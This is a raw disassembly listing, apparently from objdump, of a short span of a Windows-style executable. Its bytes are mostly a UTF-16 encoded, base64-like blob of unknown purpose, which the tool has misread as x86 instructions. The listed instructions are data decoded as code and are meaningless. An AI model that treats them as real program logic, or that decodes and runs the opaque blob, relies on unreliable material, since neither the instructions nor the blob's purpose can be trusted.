  40b948:	00 6e 00             	add    %ch,0x0(%esi)
  40b94b:	2f                   	das
  40b94c:	00 2b                	add    %ch,(%ebx)
  40b94e:	00 49 00             	add    %cl,0x0(%ecx)
  40b951:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40b955:	76 00                	jbe    0x40b957
  40b957:	6a 00                	push   $0x0
  40b959:	58                   	pop    %eax
  40b95a:	00 51 00             	add    %dl,0x0(%ecx)
  40b95d:	30 00                	xor    %al,(%eax)
  40b95f:	63 00                	arpl   %eax,(%eax)
  40b961:	55                   	push   %ebp
  40b962:	00 71 00             	add    %dh,0x0(%ecx)
  40b965:	6c                   	insb   (%dx),%es:(%edi)
  40b966:	00 5a 00             	add    %bl,0x0(%edx)
  40b969:	59                   	pop    %ecx
  40b96a:	00 43 00             	add    %al,0x0(%ebx)
  40b96d:	6d                   	insl   (%dx),%es:(%edi)
  40b96e:	00 79 00             	add    %bh,0x0(%ecx)
  40b971:	4b                   	dec    %ebx
  40b972:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40b976:	00 45 00             	add    %al,0x0(%ebp)
  40b979:	33 00                	xor    (%eax),%eax
  40b97b:	41                   	inc    %ecx
  40b97c:	00 5a 00             	add    %bl,0x0(%edx)
  40b97f:	5a                   	pop    %edx
  40b980:	00 4b 00             	add    %cl,0x0(%ebx)
  40b983:	63 00                	arpl   %eax,(%eax)
  40b985:	63 00                	arpl   %eax,(%eax)
  40b987:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  40b98b:	2b 00                	sub    (%eax),%eax
  40b98d:	61                   	popa
  40b98e:	00 39                	add    %bh,(%ecx)
  40b990:	00 45 00             	add    %al,0x0(%ebp)
  40b993:	31 00                	xor    %eax,(%eax)
  40b995:	6d                   	insl   (%dx),%es:(%edi)
  40b996:	00 38                	add    %bh,(%eax)
  40b998:	00 59 00             	add    %bl,0x0(%ecx)
  40b99b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b99c:	00 47 00             	add    %al,0x0(%edi)
  40b99f:	49                   	dec    %ecx
  40b9a0:	00 6b 00             	add    %ch,0x0(%ebx)
  40b9a3:	63 00                	arpl   %eax,(%eax)
  40b9a5:	73 00                	jae    0x40b9a7
  40b9a7:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40b9ab:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9ac:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b9af:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b9b2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b9b5:	68 00 45 00 37       	push   $0x37004500
  40b9ba:	00 4f 00             	add    %cl,0x0(%edi)
  40b9bd:	52                   	push   %edx
  40b9be:	00 51 00             	add    %dl,0x0(%ecx)
  40b9c1:	71 00                	jno    0x40b9c3
  40b9c3:	32 00                	xor    (%eax),%al
  40b9c5:	47                   	inc    %edi
  40b9c6:	00 65 00             	add    %ah,0x0(%ebp)
  40b9c9:	72 00                	jb     0x40b9cb
  40b9cb:	52                   	push   %edx
  40b9cc:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  40b9d0:	00 6a 00             	add    %ch,0x0(%edx)
  40b9d3:	4a                   	dec    %edx
  40b9d4:	00 42 00             	add    %al,0x0(%edx)
  40b9d7:	5a                   	pop    %edx
  40b9d8:	00 45 00             	add    %al,0x0(%ebp)
  40b9db:	54                   	push   %esp
  40b9dc:	00 65 00             	add    %ah,0x0(%ebp)
  40b9df:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  40b9e3:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40b9e7:	50                   	push   %eax
  40b9e8:	00 50 00             	add    %dl,0x0(%eax)
  40b9eb:	4e                   	dec    %esi
  40b9ec:	00 63 00             	add    %ah,0x0(%ebx)
  40b9ef:	52                   	push   %edx
  40b9f0:	00 7a 00             	add    %bh,0x0(%edx)
  40b9f3:	61                   	popa
  40b9f4:	00 69 00             	add    %ch,0x0(%ecx)
  40b9f7:	6a 00                	push   $0x0
  40b9f9:	78 00                	js     0x40b9fb
  40b9fb:	37                   	aaa
  40b9fc:	00 49 00             	add    %cl,0x0(%ecx)
  40b9ff:	4f                   	dec    %edi
  40ba00:	00 50 00             	add    %dl,0x0(%eax)
  40ba03:	6b 00 35             	imul   $0x35,(%eax),%eax
  40ba06:	00 52 00             	add    %dl,0x0(%edx)
  40ba09:	44                   	inc    %esp
  40ba0a:	00 43 00             	add    %al,0x0(%ebx)
  40ba0d:	34 00                	xor    $0x0,%al
  40ba0f:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba10:	00 50 00             	add    %dl,0x0(%eax)
  40ba13:	69 00 30 00 7a 00    	imul   $0x7a0030,(%eax),%eax
  40ba19:	77 00                	ja     0x40ba1b
  40ba1b:	68 00 53 00 70       	push   $0x70005300
  40ba20:	00 75 00             	add    %dh,0x0(%ebp)
  40ba23:	46                   	inc    %esi
  40ba24:	00 4d 00             	add    %cl,0x0(%ebp)
  40ba27:	4b                   	dec    %ebx
  40ba28:	00 31                	add    %dh,(%ecx)
  40ba2a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba2d:	71 00                	jno    0x40ba2f
  40ba2f:	4f                   	dec    %edi
  40ba30:	00 48 00             	add    %cl,0x0(%eax)
  40ba33:	56                   	push   %esi
  40ba34:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba37:	79 00                	jns    0x40ba39
  40ba39:	76 00                	jbe    0x40ba3b
  40ba3b:	2b 00                	sub    (%eax),%eax
  40ba3d:	58                   	pop    %eax
  40ba3e:	00 41 00             	add    %al,0x0(%ecx)
  40ba41:	4c                   	dec    %esp
  40ba42:	00 66 00             	add    %ah,0x0(%esi)
  40ba45:	39 00                	cmp    %eax,(%eax)
  40ba47:	4c                   	dec    %esp
  40ba48:	00 50 00             	add    %dl,0x0(%eax)
  40ba4b:	72 00                	jb     0x40ba4d
  40ba4d:	42                   	inc    %edx
  40ba4e:	00 31                	add    %dh,(%ecx)
  40ba50:	00 30                	add    %dh,(%eax)
  40ba52:	00 68 00             	add    %ch,0x0(%eax)
  40ba55:	5a                   	pop    %edx
  40ba56:	00 69 00             	add    %ch,0x0(%ecx)
  40ba59:	32 00                	xor    (%eax),%al
  40ba5b:	34 00                	xor    $0x0,%al
  40ba5d:	6c                   	insb   (%dx),%es:(%edi)
  40ba5e:	00 47 00             	add    %al,0x0(%edi)
  40ba61:	49                   	dec    %ecx
  40ba62:	00 56 00             	add    %dl,0x0(%esi)
  40ba65:	31 00                	xor    %eax,(%eax)
  40ba67:	56                   	push   %esi
  40ba68:	00 42 00             	add    %al,0x0(%edx)
  40ba6b:	78 00                	js     0x40ba6d
  40ba6d:	38 00                	cmp    %al,(%eax)
  40ba6f:	2f                   	das
  40ba70:	00 67 00             	add    %ah,0x0(%edi)
  40ba73:	49                   	dec    %ecx
  40ba74:	00 4c 00 41          	add    %cl,0x41(%eax,%eax,1)
  40ba78:	00 4d 00             	add    %cl,0x0(%ebp)
  40ba7b:	4a                   	dec    %edx
  40ba7c:	00 79 00             	add    %bh,0x0(%ecx)
  40ba7f:	73 00                	jae    0x40ba81
  40ba81:	35 00 5a 00 73       	xor    $0x73005a00,%eax
  40ba86:	00 35 00 6e 00 56    	add    %dh,0x56006e00
  40ba8c:	00 56 00             	add    %dl,0x0(%esi)
  40ba8f:	4a                   	dec    %edx
  40ba90:	00 73 00             	add    %dh,0x0(%ebx)
  40ba93:	2f                   	das
  40ba94:	00 72 00             	add    %dh,0x0(%edx)
  40ba97:	70 00                	jo     0x40ba99
  40ba99:	57                   	push   %edi
  40ba9a:	00 77 00             	add    %dh,0x0(%edi)
  40ba9d:	4a                   	dec    %edx
  40ba9e:	00 53 00             	add    %dl,0x0(%ebx)
  40baa1:	73 00                	jae    0x40baa3
  40baa3:	4e                   	dec    %esi
  40baa4:	00 42 00             	add    %al,0x0(%edx)
  40baa7:	76 00                	jbe    0x40baa9
  40baa9:	30 00                	xor    %al,(%eax)
  40baab:	4c                   	dec    %esp
  40baac:	00 32                	add    %dh,(%edx)
  40baae:	00 32                	add    %dh,(%edx)
  40bab0:	00 48 00             	add    %cl,0x0(%eax)
  40bab3:	4c                   	dec    %esp
  40bab4:	00 43 00             	add    %al,0x0(%ebx)
  40bab7:	2b 00                	sub    (%eax),%eax
  40bab9:	4f                   	dec    %edi
  40baba:	00 7a 00             	add    %bh,0x0(%edx)
  40babd:	47                   	inc    %edi
  40babe:	00 31                	add    %dh,(%ecx)
  40bac0:	00 68 00             	add    %ch,0x0(%eax)
  40bac3:	41                   	inc    %ecx
  40bac4:	00 69 00             	add    %ch,0x0(%ecx)
  40bac7:	34 00                	xor    $0x0,%al
  40bac9:	76 00                	jbe    0x40bacb
  40bacb:	46                   	inc    %esi
  40bacc:	00 49 00             	add    %cl,0x0(%ecx)
  40bacf:	50                   	push   %eax
  40bad0:	00 45 00             	add    %al,0x0(%ebp)
  40bad3:	58                   	pop    %eax
  40bad4:	00 63 00             	add    %ah,0x0(%ebx)
  40bad7:	36 00 2f             	add    %ch,%ss:(%edi)
  40bada:	00 62 00             	add    %ah,0x0(%edx)
  40badd:	47                   	inc    %edi
  40bade:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40bae2:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40bae6:	00 46 00             	add    %al,0x0(%esi)
  40bae9:	43                   	inc    %ebx
  40baea:	00 49 00             	add    %cl,0x0(%ecx)
  40baed:	43                   	inc    %ebx
  40baee:	00 53 00             	add    %dl,0x0(%ebx)
  40baf1:	59                   	pop    %ecx
  40baf2:	00 73 00             	add    %dh,0x0(%ebx)
  40baf5:	77 00                	ja     0x40baf7
  40baf7:	6c                   	insb   (%dx),%es:(%edi)
  40baf8:	00 70 00             	add    %dh,0x0(%eax)
  40bafb:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40baff:	5a                   	pop    %edx
  40bb00:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  40bb04:	00 4a 00             	add    %cl,0x0(%edx)
  40bb07:	61                   	popa
  40bb08:	00 75 00             	add    %dh,0x0(%ebp)
  40bb0b:	6a 00                	push   $0x0
  40bb0d:	7a 00                	jp     0x40bb0f
  40bb0f:	30 00                	xor    %al,(%eax)
  40bb11:	44                   	inc    %esp
  40bb12:	00 37                	add    %dh,(%edi)
  40bb14:	00 4e 00             	add    %cl,0x0(%esi)
  40bb17:	50                   	push   %eax
  40bb18:	00 61 00             	add    %ah,0x0(%ecx)
  40bb1b:	4b                   	dec    %ebx
  40bb1c:	00 71 00             	add    %dh,0x0(%ecx)
  40bb1f:	32 00                	xor    (%eax),%al
  40bb21:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bb25:	34 00                	xor    $0x0,%al
  40bb27:	30 00                	xor    %al,(%eax)
  40bb29:	72 00                	jb     0x40bb2b
  40bb2b:	58                   	pop    %eax
  40bb2c:	00 56 00             	add    %dl,0x0(%esi)
  40bb2f:	51                   	push   %ecx
  40bb30:	00 59 00             	add    %bl,0x0(%ecx)
  40bb33:	61                   	popa
  40bb34:	00 48 00             	add    %cl,0x0(%eax)
  40bb37:	2f                   	das
  40bb38:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  40bb3c:	00 63 00             	add    %ah,0x0(%ebx)
  40bb3f:	4e                   	dec    %esi
  40bb40:	00 41 00             	add    %al,0x0(%ecx)
  40bb43:	41                   	inc    %ecx
  40bb44:	00 5a 00             	add    %bl,0x0(%edx)
  40bb47:	39 00                	cmp    %eax,(%eax)
  40bb49:	69 00 48 00 6d 00    	imul   $0x6d0048,(%eax),%eax
  40bb4f:	30 00                	xor    %al,(%eax)
  40bb51:	37                   	aaa
  40bb52:	00 4e 00             	add    %cl,0x0(%esi)
  40bb55:	49                   	dec    %ecx
  40bb56:	00 58 00             	add    %bl,0x0(%eax)
  40bb59:	76 00                	jbe    0x40bb5b
  40bb5b:	58                   	pop    %eax
  40bb5c:	00 38                	add    %bh,(%eax)
  40bb5e:	00 53 00             	add    %dl,0x0(%ebx)
  40bb61:	37                   	aaa
  40bb62:	00 66 00             	add    %ah,0x0(%esi)
  40bb65:	55                   	push   %ebp
  40bb66:	00 38                	add    %bh,(%eax)
  40bb68:	00 72 00             	add    %dh,0x0(%edx)
  40bb6b:	70 00                	jo     0x40bb6d
  40bb6d:	5a                   	pop    %edx
  40bb6e:	00 71 00             	add    %dh,0x0(%ecx)
  40bb71:	53                   	push   %ebx
  40bb72:	00 6e 00             	add    %ch,0x0(%esi)
  40bb75:	34 00                	xor    $0x0,%al
  40bb77:	63 00                	arpl   %eax,(%eax)
  40bb79:	30 00                	xor    %al,(%eax)
  40bb7b:	30 00                	xor    %al,(%eax)
  40bb7d:	66 00 33             	data16 add %dh,(%ebx)
  40bb80:	00 78 00             	add    %bh,0x0(%eax)
  40bb83:	47                   	inc    %edi
  40bb84:	00 66 00             	add    %ah,0x0(%esi)
  40bb87:	75 00                	jne    0x40bb89
  40bb89:	70 00                	jo     0x40bb8b
  40bb8b:	38 00                	cmp    %al,(%eax)
  40bb8d:	45                   	inc    %ebp
  40bb8e:	00 48 00             	add    %cl,0x0(%eax)
  40bb91:	78 00                	js     0x40bb93
  40bb93:	6a 00                	push   $0x0
  40bb95:	66 00 42 00          	data16 add %al,0x0(%edx)
  40bb99:	41                   	inc    %ecx
  40bb9a:	00 45 00             	add    %al,0x0(%ebp)
  40bb9d:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40bba0:	00 2f                	add    %ch,(%edi)
  40bba2:	00 42 00             	add    %al,0x0(%edx)
  40bba5:	4c                   	dec    %esp
  40bba6:	00 6d 00             	add    %ch,0x0(%ebp)
  40bba9:	46                   	inc    %esi
  40bbaa:	00 43 00             	add    %al,0x0(%ebx)
  40bbad:	4e                   	dec    %esi
  40bbae:	00 41 00             	add    %al,0x0(%ecx)
  40bbb1:	69 00 76 00 56 00    	imul   $0x560076,(%eax),%eax
  40bbb7:	34 00                	xor    $0x0,%al
  40bbb9:	48                   	dec    %eax
  40bbba:	00 66 00             	add    %ah,0x0(%esi)
  40bbbd:	4f                   	dec    %edi
  40bbbe:	00 73 00             	add    %dh,0x0(%ebx)
  40bbc1:	4a                   	dec    %edx
  40bbc2:	00 57 00             	add    %dl,0x0(%edi)
  40bbc5:	45                   	inc    %ebp
  40bbc6:	00 6b 00             	add    %ch,0x0(%ebx)
  40bbc9:	33 00                	xor    (%eax),%eax
  40bbcb:	4e                   	dec    %esi
  40bbcc:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40bbd0:	00 79 00             	add    %bh,0x0(%ecx)
  40bbd3:	63 00                	arpl   %eax,(%eax)
  40bbd5:	71 00                	jno    0x40bbd7
  40bbd7:	49                   	dec    %ecx
  40bbd8:	00 55 00             	add    %dl,0x0(%ebp)
  40bbdb:	58                   	pop    %eax
  40bbdc:	00 6e 00             	add    %ch,0x0(%esi)
  40bbdf:	58                   	pop    %eax
  40bbe0:	00 61 00             	add    %ah,0x0(%ecx)
  40bbe3:	51                   	push   %ecx
  40bbe4:	00 77 00             	add    %dh,0x0(%edi)
  40bbe7:	77 00                	ja     0x40bbe9
  40bbe9:	78 00                	js     0x40bbeb
  40bbeb:	5a                   	pop    %edx
  40bbec:	00 75 00             	add    %dh,0x0(%ebp)
  40bbef:	4e                   	dec    %esi
  40bbf0:	00 30                	add    %dh,(%eax)
  40bbf2:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40bbf6:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40bbfa:	00 6e 00             	add    %ch,0x0(%esi)
  40bbfd:	63 00                	arpl   %eax,(%eax)
  40bbff:	55                   	push   %ebp
  40bc00:	00 55 00             	add    %dl,0x0(%ebp)
  40bc03:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40bc07:	5a                   	pop    %edx
  40bc08:	00 39                	add    %bh,(%ecx)
  40bc0a:	00 49 00             	add    %cl,0x0(%ecx)
  40bc0d:	4b                   	dec    %ebx
  40bc0e:	00 69 00             	add    %ch,0x0(%ecx)
  40bc11:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc12:	00 30                	add    %dh,(%eax)
  40bc14:	00 78 00             	add    %bh,0x0(%eax)
  40bc17:	51                   	push   %ecx
  40bc18:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  40bc1c:	00 52 00             	add    %dl,0x0(%edx)
  40bc1f:	53                   	push   %ebx
  40bc20:	00 39                	add    %bh,(%ecx)
  40bc22:	00 41 00             	add    %al,0x0(%ecx)
  40bc25:	33 00                	xor    (%eax),%eax
  40bc27:	79 00                	jns    0x40bc29
  40bc29:	32 00                	xor    (%eax),%al
  40bc2b:	55                   	push   %ebp
  40bc2c:	00 45 00             	add    %al,0x0(%ebp)
  40bc2f:	45                   	inc    %ebp
  40bc30:	00 6b 00             	add    %ch,0x0(%ebx)
  40bc33:	4e                   	dec    %esi
  40bc34:	00 45 00             	add    %al,0x0(%ebp)
  40bc37:	6c                   	insb   (%dx),%es:(%edi)
  40bc38:	00 6b 00             	add    %ch,0x0(%ebx)
  40bc3b:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc3c:	00 5a 00             	add    %bl,0x0(%edx)
  40bc3f:	48                   	dec    %eax
  40bc40:	00 55 00             	add    %dl,0x0(%ebp)
  40bc43:	6d                   	insl   (%dx),%es:(%edi)
  40bc44:	00 36                	add    %dh,(%esi)
  40bc46:	00 70 00             	add    %dh,0x0(%eax)
  40bc49:	2f                   	das
  40bc4a:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40bc4e:	00 47 00             	add    %al,0x0(%edi)
  40bc51:	48                   	dec    %eax
  40bc52:	00 47 00             	add    %al,0x0(%edi)
  40bc55:	76 00                	jbe    0x40bc57
  40bc57:	47                   	inc    %edi
  40bc58:	00 76 00             	add    %dh,0x0(%esi)
  40bc5b:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40bc5f:	45                   	inc    %ebp
  40bc60:	00 52 00             	add    %dl,0x0(%edx)
  40bc63:	74 00                	je     0x40bc65
  40bc65:	5a                   	pop    %edx
  40bc66:	00 50 00             	add    %dl,0x0(%eax)
  40bc69:	72 00                	jb     0x40bc6b
  40bc6b:	64 00 2f             	add    %ch,%fs:(%edi)
  40bc6e:	00 2f                	add    %ch,(%edi)
  40bc70:	00 52 00             	add    %dl,0x0(%edx)
  40bc73:	70 00                	jo     0x40bc75
  40bc75:	4a                   	dec    %edx
  40bc76:	00 31                	add    %dh,(%ecx)
  40bc78:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  40bc7c:	00 58 00             	add    %bl,0x0(%eax)
  40bc7f:	58                   	pop    %eax
  40bc80:	00 6f 00             	add    %ch,0x0(%edi)
  40bc83:	63 00                	arpl   %eax,(%eax)
  40bc85:	52                   	push   %edx
  40bc86:	00 49 00             	add    %cl,0x0(%ecx)
  40bc89:	56                   	push   %esi
  40bc8a:	00 71 00             	add    %dh,0x0(%ecx)
  40bc8d:	75 00                	jne    0x40bc8f
  40bc8f:	73 00                	jae    0x40bc91
  40bc91:	55                   	push   %ebp
  40bc92:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40bc96:	00 66 00             	add    %ah,0x0(%esi)
  40bc99:	48                   	dec    %eax
  40bc9a:	00 66 00             	add    %ah,0x0(%esi)
  40bc9d:	4e                   	dec    %esi
  40bc9e:	00 38                	add    %bh,(%eax)
  40bca0:	00 7a 00             	add    %bh,0x0(%edx)
  40bca3:	34 00                	xor    $0x0,%al
  40bca5:	46                   	inc    %esi
  40bca6:	00 51 00             	add    %dl,0x0(%ecx)
  40bca9:	52                   	push   %edx
  40bcaa:	00 67 00             	add    %ah,0x0(%edi)
  40bcad:	6a 00                	push   $0x0
  40bcaf:	59                   	pop    %ecx
  40bcb0:	00 50 00             	add    %dl,0x0(%eax)
  40bcb3:	55                   	push   %ebp
  40bcb4:	00 7a 00             	add    %bh,0x0(%edx)
  40bcb7:	44                   	inc    %esp
  40bcb8:	00 79 00             	add    %bh,0x0(%ecx)
  40bcbb:	43                   	inc    %ebx
  40bcbc:	00 38                	add    %bh,(%eax)
  40bcbe:	00 4f 00             	add    %cl,0x0(%edi)
  40bcc1:	4f                   	dec    %edi
  40bcc2:	00 72 00             	add    %dh,0x0(%edx)
  40bcc5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcc6:	00 69 00             	add    %ch,0x0(%ecx)
  40bcc9:	4d                   	dec    %ebp
  40bcca:	00 51 00             	add    %dl,0x0(%ecx)
  40bccd:	7a 00                	jp     0x40bccf
  40bccf:	35 00 2b 00 4d       	xor    $0x4d002b00,%eax
  40bcd4:	00 4a 00             	add    %cl,0x0(%edx)
  40bcd7:	49                   	dec    %ecx
  40bcd8:	00 62 00             	add    %ah,0x0(%edx)
  40bcdb:	4b                   	dec    %ebx
  40bcdc:	00 33                	add    %dh,(%ebx)
  40bcde:	00 78 00             	add    %bh,0x0(%eax)
  40bce1:	43                   	inc    %ebx
  40bce2:	00 41 00             	add    %al,0x0(%ecx)
  40bce5:	4f                   	dec    %edi
  40bce6:	00 36                	add    %dh,(%esi)
  40bce8:	00 55 00             	add    %dl,0x0(%ebp)
  40bceb:	6b 00 54             	imul   $0x54,(%eax),%eax
  40bcee:	00 67 00             	add    %ah,0x0(%edi)
  40bcf1:	38 00                	cmp    %al,(%eax)
  40bcf3:	64 00 31             	add    %dh,%fs:(%ecx)
  40bcf6:	00 4a 00             	add    %cl,0x0(%edx)
  40bcf9:	4e                   	dec    %esi
  40bcfa:	00 6e 00             	add    %ch,0x0(%esi)
  40bcfd:	41                   	inc    %ecx
  40bcfe:	00 66 00             	add    %ah,0x0(%esi)
  40bd01:	43                   	inc    %ebx
  40bd02:	00 46 00             	add    %al,0x0(%esi)
  40bd05:	75 00                	jne    0x40bd07
  40bd07:	47                   	inc    %edi
  40bd08:	00 53 00             	add    %dl,0x0(%ebx)
  40bd0b:	78 00                	js     0x40bd0d
  40bd0d:	35 00 42 00 56       	xor    $0x56004200,%eax
  40bd12:	00 48 00             	add    %cl,0x0(%eax)
  40bd15:	70 00                	jo     0x40bd17
  40bd17:	38 00                	cmp    %al,(%eax)
  40bd19:	76 00                	jbe    0x40bd1b
  40bd1b:	62 00                	bound  %eax,(%eax)
  40bd1d:	41                   	inc    %ecx
  40bd1e:	00 41 00             	add    %al,0x0(%ecx)
  40bd21:	7a 00                	jp     0x40bd23
  40bd23:	30 00                	xor    %al,(%eax)
  40bd25:	61                   	popa
  40bd26:	00 32                	add    %dh,(%edx)
  40bd28:	00 31                	add    %dh,(%ecx)
  40bd2a:	00 4e 00             	add    %cl,0x0(%esi)
  40bd2d:	70 00                	jo     0x40bd2f
  40bd2f:	63 00                	arpl   %eax,(%eax)
  40bd31:	39 00                	cmp    %eax,(%eax)
  40bd33:	37                   	aaa
  40bd34:	00 37                	add    %dh,(%edi)
  40bd36:	00 66 00             	add    %ah,0x0(%esi)
  40bd39:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40bd3d:	58                   	pop    %eax
  40bd3e:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  40bd42:	00 4b 00             	add    %cl,0x0(%ebx)
  40bd45:	71 00                	jno    0x40bd47
  40bd47:	73 00                	jae    0x40bd49
  40bd49:	59                   	pop    %ecx
  40bd4a:	00 7a 00             	add    %bh,0x0(%edx)
  40bd4d:	33 00                	xor    (%eax),%eax
  40bd4f:	59                   	pop    %ecx
  40bd50:	00 49 00             	add    %cl,0x0(%ecx)
  40bd53:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40bd57:	4e                   	dec    %esi
  40bd58:	00 5a 00             	add    %bl,0x0(%edx)
  40bd5b:	57                   	push   %edi
  40bd5c:	00 47 00             	add    %al,0x0(%edi)
  40bd5f:	6b 00 35             	imul   $0x35,(%eax),%eax
  40bd62:	00 6a 00             	add    %ch,0x0(%edx)
  40bd65:	39 00                	cmp    %eax,(%eax)
  40bd67:	32 00                	xor    (%eax),%al
  40bd69:	58                   	pop    %eax
  40bd6a:	00 76 00             	add    %dh,0x0(%esi)
  40bd6d:	35 00 36 00 61       	xor    $0x61003600,%eax
  40bd72:	00 69 00             	add    %ch,0x0(%ecx)
  40bd75:	58                   	pop    %eax
  40bd76:	00 53 00             	add    %dl,0x0(%ebx)
  40bd79:	4f                   	dec    %edi
  40bd7a:	00 70 00             	add    %dh,0x0(%eax)
  40bd7d:	4d                   	dec    %ebp
  40bd7e:	00 76 00             	add    %dh,0x0(%esi)
  40bd81:	63 00                	arpl   %eax,(%eax)
  40bd83:	49                   	dec    %ecx
  40bd84:	00 59 00             	add    %bl,0x0(%ecx)
  40bd87:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd88:	00 2f                	add    %ch,(%edi)
  40bd8a:	00 55 00             	add    %dl,0x0(%ebp)
  40bd8d:	31 00                	xor    %eax,(%eax)
  40bd8f:	39 00                	cmp    %eax,(%eax)
  40bd91:	6a 00                	push   $0x0
  40bd93:	4f                   	dec    %edi
  40bd94:	00 4a 00             	add    %cl,0x0(%edx)
  40bd97:	69 00 4e 00 41 00    	imul   $0x41004e,(%eax),%eax
  40bd9d:	71 00                	jno    0x40bd9f
  40bd9f:	31 00                	xor    %eax,(%eax)
  40bda1:	6b 00 33             	imul   $0x33,(%eax),%eax
  40bda4:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40bda8:	00 38                	add    %bh,(%eax)
  40bdaa:	00 65 00             	add    %ah,0x0(%ebp)
  40bdad:	53                   	push   %ebx
  40bdae:	00 48 00             	add    %cl,0x0(%eax)
  40bdb1:	4d                   	dec    %ebp
  40bdb2:	00 78 00             	add    %bh,0x0(%eax)
  40bdb5:	37                   	aaa
  40bdb6:	00 43 00             	add    %al,0x0(%ebx)
  40bdb9:	63 00                	arpl   %eax,(%eax)
  40bdbb:	38 00                	cmp    %al,(%eax)
  40bdbd:	4d                   	dec    %ebp
  40bdbe:	00 4e 00             	add    %cl,0x0(%esi)
  40bdc1:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40bdc5:	30 00                	xor    %al,(%eax)
  40bdc7:	78 00                	js     0x40bdc9
  40bdc9:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40bdcd:	46                   	inc    %esi
  40bdce:	00 45 00             	add    %al,0x0(%ebp)
  40bdd1:	6b 00 73             	imul   $0x73,(%eax),%eax
  40bdd4:	00 47 00             	add    %al,0x0(%edi)
  40bdd7:	57                   	push   %edi
  40bdd8:	00 30                	add    %dh,(%eax)
  40bdda:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  40bdde:	00 33                	add    %dh,(%ebx)
  40bde0:	00 68 00             	add    %ch,0x0(%eax)
  40bde3:	38 00                	cmp    %al,(%eax)
  40bde5:	44                   	inc    %esp
  40bde6:	00 57 00             	add    %dl,0x0(%edi)
  40bde9:	6b 00 41             	imul   $0x41,(%eax),%eax
  40bdec:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40bdf2:	80 b1 67 00 52 00 4d 	xorb   $0x4d,0x520067(%ecx)
  40bdf9:	00 75 00             	add    %dh,0x0(%ebp)
  40bdfc:	54                   	push   %esp
  40bdfd:	00 6a 00             	add    %ch,0x0(%edx)
  40be00:	63 00                	arpl   %eax,(%eax)
  40be02:	61                   	popa
  40be03:	00 47 00             	add    %al,0x0(%edi)
  40be06:	68 00 36 00 57       	push   $0x57003600
  40be0b:	00 37                	add    %dh,(%edi)
  40be0d:	00 45 00             	add    %al,0x0(%ebp)
  40be10:	55                   	push   %ebp
  40be11:	00 31                	add    %dh,(%ecx)
  40be13:	00 4b 00             	add    %cl,0x0(%ebx)
  40be16:	74 00                	je     0x40be18
  40be18:	4a                   	dec    %edx
  40be19:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  40be1d:	00 6d 00             	add    %ch,0x0(%ebp)
  40be20:	31 00                	xor    %eax,(%eax)
  40be22:	38 00                	cmp    %al,(%eax)
  40be24:	32 00                	xor    (%eax),%al
  40be26:	74 00                	je     0x40be28
  40be28:	52                   	push   %edx
  40be29:	00 6a 00             	add    %ch,0x0(%edx)
  40be2c:	39 00                	cmp    %eax,(%eax)
  40be2e:	4e                   	dec    %esi
  40be2f:	00 6e 00             	add    %ch,0x0(%esi)
  40be32:	62 00                	bound  %eax,(%eax)
  40be34:	54                   	push   %esp
  40be35:	00 76 00             	add    %dh,0x0(%esi)
  40be38:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40be3c:	61                   	popa
  40be3d:	00 58 00             	add    %bl,0x0(%eax)
  40be40:	63 00                	arpl   %eax,(%eax)
  40be42:	71 00                	jno    0x40be44
  40be44:	6a 00                	push   $0x0
  40be46:	4a                   	dec    %edx
  40be47:	00 4b 00             	add    %cl,0x0(%ebx)
  40be4a:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40be4e:	2f                   	das
  40be4f:	00 73 00             	add    %dh,0x0(%ebx)
  40be52:	48                   	dec    %eax
  40be53:	00 37                	add    %dh,(%edi)
  40be55:	00 32                	add    %dh,(%edx)
  40be57:	00 6e 00             	add    %ch,0x0(%esi)
  40be5a:	59                   	pop    %ecx
  40be5b:	00 76 00             	add    %dh,0x0(%esi)
  40be5e:	39 00                	cmp    %eax,(%eax)
  40be60:	32 00                	xor    (%eax),%al
  40be62:	57                   	push   %edi
  40be63:	00 5a 00             	add    %bl,0x0(%edx)
  40be66:	71 00                	jno    0x40be68
  40be68:	35 00 62 00 36       	xor    $0x36006200,%eax
  40be6d:	00 35 00 54 00 2f    	add    %dh,0x2f005400
